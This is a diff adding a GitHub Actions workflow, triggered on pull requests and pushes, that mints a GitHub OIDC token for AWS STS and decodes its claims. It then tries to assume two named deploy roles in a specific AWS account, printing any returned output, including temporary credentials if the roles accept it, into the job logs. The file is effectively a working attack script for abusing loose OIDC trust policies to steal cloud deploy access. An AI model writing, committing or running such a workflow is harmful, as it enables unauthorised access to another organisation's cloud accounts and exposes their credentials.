@@ -1,0 +1,26 @@
+name: oidc-probe
+on:
+  pull_request:
+  push:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: mint
+        run: |
+          TOK=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | python3 -c "import sys,json;print(json.load(sys.stdin)['value'])")
+          echo "$TOK" > /tmp/idtoken
+          python3 - <<'EOF'
+import base64
+t=open('/tmp/idtoken').read().strip()
+p=t.split('.')[1]; p+='='*(-len(p)%4)
+print('PAYLOAD', base64.urlsafe_b64decode(p).decode())
+EOF
+          pip install awscli -q
+          for ROLE in bloodline-hitl-apis-github-actions-deploy-role bloodline-backend-apis-github-actions-deploy-role; do
+            echo "=== $ROLE ==="
+            aws sts assume-role-with-web-identity --role-arn arn:aws:iam::370180090626:role/$ROLE --role-session-name ghprobe --web-identity-token "$TOK" --duration-seconds 900 2>&1 | head -15
+          done
